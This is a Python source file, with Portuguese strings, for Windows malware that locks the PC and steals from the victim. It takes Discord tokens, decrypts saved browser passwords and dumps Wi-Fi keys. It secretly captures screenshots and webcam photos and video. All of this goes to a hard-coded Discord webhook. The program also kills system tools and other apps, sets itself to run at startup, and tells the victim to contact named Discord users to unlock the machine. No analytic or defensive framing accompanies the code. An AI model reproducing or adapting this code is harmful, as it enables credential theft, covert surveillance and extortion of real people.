import os
import shutil
import socket
import requests
import pyautogui
import cv2
import time
import tempfile
import subprocess
import ctypes
import win32api
import win32con
import win32gui
import win32process
import json
import sqlite3
import base64
import threading
from datetime import datetime
from threading import Thread
import pytz
import tkinter as tk
from tkinter import messagebox
import keyboard
import glob
import shutil
import win32crypt

# --- CONFIGURA√á√ïES ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1394031732721979422/doqnuLAykcwssJWYCTJ5hdR-zLIiPj716YuOGAwvqQ_XRAYP3dwtg6QsLogDzi5sSL8A"
CODIGO_SECRETO = "jolgue"
INTERVALO_MINUTOS = 5
INTERVALO_12H = 12 * 60 * 60
APPS_PERMITIDOS = ["RobloxPlayerBeta.exe", "Discord.exe"]
TEXTO_AVISO = (
    "‚ö†Ô∏è Est√° tudo bloqueado tirando o Roblox e o Discord.\n"
    "Fala com o ‚Äúgoncal_fruits._69394‚Äù ou com o ‚Äújolgue_011‚Äù no Discord para desbloquear o teu PC."
)
FLAG_DESBLOQUEIO = "C:\\ProgramData\\unlocked.flag"
NOME_EXE = "bloqueio.exe"  # Nome do teu EXE compilado

# --- FUN√á√ïES AUXILIARES ---

def enviar_webhook(mensagem, ficheiro=None):
    data = {"content": mensagem}
    files = {}
    if ficheiro:
        try:
            files["file"] = (os.path.basename(ficheiro), open(ficheiro, 'rb'))
        except Exception as e:
            print(f"Erro ao abrir ficheiro: {e}")
    try:
        requests.post(WEBHOOK_URL, data=data, files=files)
    except Exception as e:
        print(f"Erro ao enviar webhook: {e}")

def obter_ip_localizacao():
    try:
        response = requests.get("http://ip-api.com/json/")
        info = response.json()
        return (
            f"IP: {info.get('query')}\n"
            f"Cidade: {info.get('city')}\n"
            f"Regi√£o: {info.get('regionName')}\n"
            f"Pa√≠s: {info.get('country')}\n"
            f"ISP: {info.get('isp')}\n"
        )
    except:
        return "N√£o foi poss√≠vel obter a localiza√ß√£o."

def obter_ssid():
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'SSID' in linha and 'BSSID' not in linha:
                return linha.split(':')[1].strip()
    except:
        return "N√£o foi poss√≠vel obter o SSID"

def obter_senha_wifi(ssid):
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'Key Content' in linha:
                return linha.split(':')[1].strip()
        return "Senha n√£o encontrada"
    except:
        return "N√£o foi poss√≠vel obter a senha"

def esconder_janela():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

def tirar_screenshot():
    caminho = os.path.join(tempfile.gettempdir(), "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(caminho)
    return caminho

def tirar_foto_webcam():
    caminho = os.path.join(tempfile.gettempdir(), "webcam.png")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(caminho, frame)
    cam.release()
    return caminho

def listar_processos():
    procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore")
    enviar_webhook(f"üìÉ Processos ativos ({hostname}):\n{procs[:1900]}")

def listar_desktop():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    arquivos = "\n".join(os.listdir(desktop_path))
    enviar_webhook(f"üñ•Ô∏è Ficheiros na √Årea de Trabalho ({hostname}):\n{arquivos[:1900]}")

def watchdog():
    esconder_janela()
    while not desbloqueado[0]:
        procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore").lower()
        for bloqueado in ["taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe"]:
            if bloqueado in procs:
                subprocess.call(f"taskkill /f /im {bloqueado}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

def definir_papel_preto():
    SPI_SETDESKWALLPAPER = 20
    preto_path = os.path.join(tempfile.gettempdir(), "preto.bmp")
    with open(preto_path, 'wb') as f:
        f.write(b'BM6\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00'
                b'\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x0B\x00\x00\x13\x0B\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\x00')
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, preto_path, 3)

def bloquear_apps():
    while True:
        if desbloqueado[0]:
            break
        procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore").lower()
        for linha in procs.split("\n"):
            for proc in linha.split():
                if proc.endswith(".exe") and proc not in [a.lower() for a in APPS_PERMITIDOS] and NOME_EXE.lower() not in proc:
                    subprocess.call(f"taskkill /f /im {proc}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call("shutdown -a", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

def janela_mensagem():
    def continuar():
        root.destroy()
        janela_desbloqueio()

    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("600x300")
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    tk.Label(root, text=TEXTO_AVISO, font=("Arial", 14), justify="center", wraplength=500).pack(pady=40)
    tk.Button(root, text="OK", command=continuar, font=("Arial", 12)).pack(pady=20)
    root.mainloop()

def janela_desbloqueio():
    def tentar_desbloquear():
        if entrada.get() == CODIGO_SECRETO:
            desbloqueado[0] = True
            open(FLAG_DESBLOQUEIO, "w").write("desbloqueado")
            enviar_webhook(f"üîì C√≥digo correto inserido. PC desbloqueado ({hostname})")
            root.destroy()
        else:
            messagebox.showerror("Erro", "C√≥digo incorreto!")

    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("400x200")
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    tk.Label(root, text="Insira o c√≥digo para desbloquear:", font=("Arial", 14)).pack(pady=20)
    entrada = tk.Entry(root, font=("Arial", 14), show="*")
    entrada.pack(pady=10)
    tk.Button(root, text="Desbloquear", command=tentar_desbloquear, font=("Arial", 12)).pack(pady=10)
    root.mainloop()

def atalho_secreto():
    keyboard.add_hotkey('ctrl+shift+g', desbloquear_forcado)

def desbloquear_forcado():
    if not desbloqueado[0]:
        desbloqueado[0] = True
        open(FLAG_DESBLOQUEIO, "w").write("desbloqueado")
        enviar_webhook(f"üö® PC desbloqueado com CTRL+SHIFT+G ({hostname})")

def adicionar_startup():
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = os.path.join(os.getcwd(), NOME_EXE)
    if not os.path.exists(os.path.join(startup, NOME_EXE)):
        shutil.copy2(exe_path, startup)

def pegar_token_discord():
    # Token Discord - tenta pegar dos locais mais comuns
    tokens = []
    paths = [
        os.path.expandvars(r"%APPDATA%\Discord"),
        os.path.expandvars(r"%APPDATA%\DiscordCanary"),
        os.path.expandvars(r"%APPDATA%\DiscordPTB"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
        os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
        os.path.expandvars(r"%APPDATA%\Roaming\Mozilla\Firefox\Profiles"),
    ]
    for path in paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith(".ldb") or file.endswith(".log") or file.endswith(".sqlite"):
                        try:
                            with open(os.path.join(root, file), errors="ignore") as f:
                                content = f.read()
                                for linha in content.split("\n"):
                                    if "mfa." in linha or len(linha) == 59:
                                        tokens.append(linha.strip())
                        except:
                            continue
    tokens = list(set(tokens))
    if tokens:
        enviar_webhook(f"üîë Tokens Discord encontrados ({hostname}):\n" + "\n".join(tokens))
    else:
        enviar_webhook(f"üîë Nenhum token Discord encontrado ({hostname})")

# Fun√ß√£o para decryptar senhas do Chrome/Edge (usam DPAPI no Windows)
def decrypt_password(buff):
    try:
        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except:
        return ""

# Fun√ß√£o para extrair senhas do Chrome (e derivados Edge, Brave, etc)
def extrair_senhas_chrome(path_login_data):
    senhas = []
    try:
        temp_db = os.path.join(tempfile.gettempdir(), "LoginData.db")
        shutil.copy2(path_login_data, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            password = decrypt_password(row[2])
            if password:
                senhas.append(f"URL: {url}\nUsu√°rio: {username}\nSenha: {password}")
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        senhas.append(f"Erro ao extrair senhas Chrome: {e}")
    return senhas

# Extrair senhas Firefox √© mais complexo pois √© encriptado diferente, aqui uma abordagem simples:
def extrair_senhas_firefox(profile_path):
    # Requer bibliotecas externas e n√£o trivial; por simplicidade, retornamos aviso:
    return ["[Extra√ß√£o de senhas Firefox n√£o implementada por complexidade.]"]

def extrair_senhas_navegadores():
    senhas_totais = []
    # Chrome
    chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
    if os.path.exists(chrome_path):
        senhas_totais += extrair_senhas_chrome(chrome_path)
    # Edge
    edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")
    if os.path.exists(edge_path):
        senhas_totais += extrair_senhas_chrome(edge_path)
    # Brave
    brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
    if os.path.exists(brave_path):
        senhas_totais += extrair_senhas_chrome(brave_path)
    # Opera
    opera_path = os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Login Data")
    if os.path.exists(opera_path):
        senhas_totais += extrair_senhas_chrome(opera_path)
    # Firefox (simplificado)
    firefox_profiles_path = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
    if os.path.exists(firefox_profiles_path):
        for profile in os.listdir(firefox_profiles_path):
            profile_path = os.path.join(firefox_profiles_path, profile)
            if os.path.isdir(profile_path):
                senhas_totais += extrair_senhas_firefox(profile_path)
    return senhas_totais

def enviar_senhas():
    senhas = extrair_senhas_navegadores()
    if senhas:
        mensagem = f"üîê Senhas salvas ({hostname}):\n" + "\n\n".join(senhas[:20])  # Limitar para 20 senhas
        enviar_webhook(mensagem)

# Grava√ß√£o cont√≠nua da webcam e upload a cada 30 min para Streamable (simplificado)
def gravar_webcam_continua():
    import datetime
    import subprocess
    while not desbloqueado[0]:
        nome_video = os.path.join(tempfile.gettempdir(), f"webcam_{int(time.time())}.avi")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            time.sleep(1800)
            continue
        # Grava 10 segundos
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(nome_video, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while time.time() - start_time < 10:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        cap.release()
        out.release()
        # Upload simplificado para Streamable (usar API real se quiser)
        try:
            with open(nome_video, 'rb') as f:
                r = requests.post("https://api.streamable.com/upload", files={"file": f})
            if r.status_code == 200:
                url = r.json().get('shortcode', '')
                enviar_webhook(f"üìπ Grava√ß√£o webcam ({hostname}): https://streamable.com/{url}")
            else:
                enviar_webhook(f"‚ö†Ô∏è Falha no upload do v√≠deo webcam ({hostname})")
        except Exception as e:
            enviar_webhook(f"‚ö†Ô∏è Erro no upload da grava√ß√£o webcam ({hostname}): {e}")
        try:
            os.remove(nome_video)
        except:
            pass
        for _ in range(1800):
            if desbloqueado[0]:
                break
            time.sleep(1)

# Fun√ß√£o para pegar resolu√ß√£o de tela e bateria
def obter_info_sistema():
    try:
        largura = win32api.GetSystemMetrics(0)
        altura = win32api.GetSystemMetrics(1)
    except:
        largura = altura = "Desconhecido"
    try:
        status_bateria = win32api.GetSystemPowerStatus()
        bateria = status_bateria.BatteryLifePercent
    except:
        bateria = "Desconhecida"
    return largura, altura, bateria

# Enviar info b√°sicas a cada 12 horas
def enviar_info_12h():
    while not desbloqueado[0]:
        largura, altura, bateria = obter_info_sistema()
        ip_local = obter_ip_localizacao()
        ssid = obter_ssid()
        senha_wifi = obter_senha_wifi(ssid)
        enviar_webhook(
            f"üîÑ Info 12h ({hostname}):\n"
            f"{ip_local}"
            f"Wi-Fi: {ssid}\n"
            f"Senha Wi-Fi: {senha_wifi}\n"
            f"Resolu√ß√£o: {largura}x{altura}\n"
            f"Bateria: {bateria}%\n"
        )
        time.sleep(INTERVALO_12H)

# --- EXECU√á√ÉO INICIAL ---
hostname = socket.gethostname()

if not os.path.exists(FLAG_DESBLOQUEIO):
    adicionar_startup()
    definir_papel_preto()
    info_localizacao = obter_ip_localizacao()
    ssid = obter_ssid()
    senha_wifi = obter_senha_wifi(ssid)
    enviar_webhook(
        f"üì° Monitoriza√ß√£o iniciada no PC: {hostname}\n"
        f"{info_localizacao}"
        f"Wi-Fi: {ssid}\n"
        f"Senha Wi-Fi: {senha_wifi}\n"
    )
    pegar_token_discord()
    enviar_senhas()

    desbloqueado = [False]

    Thread(target=bloquear_apps, daemon=True).start()
    Thread(target=watchdog, daemon=True).start()
    Thread(target=janela_mensagem, daemon=True).start()
    Thread(target=atalho_secreto, daemon=True).start()
    Thread(target=gravar_webcam_continua, daemon=True).start()
    Thread(target=enviar_info_12h, daemon=True).start()

    while not desbloqueado[0]:
        try:
            hora_local = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            fuso_pt = pytz.timezone("Europe/Lisbon")
            hora_pt = datetime.now(fuso_pt).strftime("%Y-%m-%d %H:%M:%S")

            screenshot = tirar_screenshot()
            enviar_webhook(f"üñ•Ô∏è Screenshot ({hostname}) | Hora PC: {hora_local} | Hora PT: {hora_pt}", ficheiro=screenshot)
            os.remove(screenshot)

            webcam = tirar_foto_webcam()
            enviar_webhook(f"üì∑ Webcam ({hostname}) | Hora PC: {hora_local} | Hora PT: {hora_pt}", ficheiro=webcam)
            os.remove(webcam)

            listar_processos()
            listar_desktop()

        except Exception as e:
            enviar_webhook(f"‚ö†Ô∏è Erro ({hostname}): {e}")
        time.sleep(INTERVALO_MINUTOS * 60)
else:
    enviar_webhook(f"‚úÖ PC j√° desbloqueado ({hostname}).")
